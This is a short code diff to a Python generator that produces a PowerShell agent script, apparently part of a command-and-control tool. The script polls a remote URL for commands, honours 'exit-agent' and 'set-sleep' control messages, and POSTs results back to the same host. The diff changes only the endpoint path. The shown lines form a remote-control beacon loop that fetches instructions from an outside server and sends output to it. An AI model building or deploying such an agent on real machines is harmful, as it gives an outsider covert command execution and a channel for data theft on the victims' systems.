@@ -8,7 +8,7 @@ def generate(url, sleep):
     while ($true)
     {
         Start-Sleep -Seconds $sleep
-        $cmd = Invoke-WebRequest '%URL%/test'
+        $cmd = Invoke-WebRequest '%URL%'
         if ($cmd.Content -eq 'exit-agent') { break }
         if ($cmd.Content -like '*set-sleep*') { $sleep = $cmd.Content.replace("set-sleep ", ""); continue }
         if ($cmd.Content -eq '') { continue }
@@ -24,7 +24,7 @@ def generate(url, sleep):
             }
         }
 
-        Invoke-RestMethod -Uri %URL%/test -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
+        Invoke-RestMethod -Uri %URL% -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
         $post = ''
     }
     """
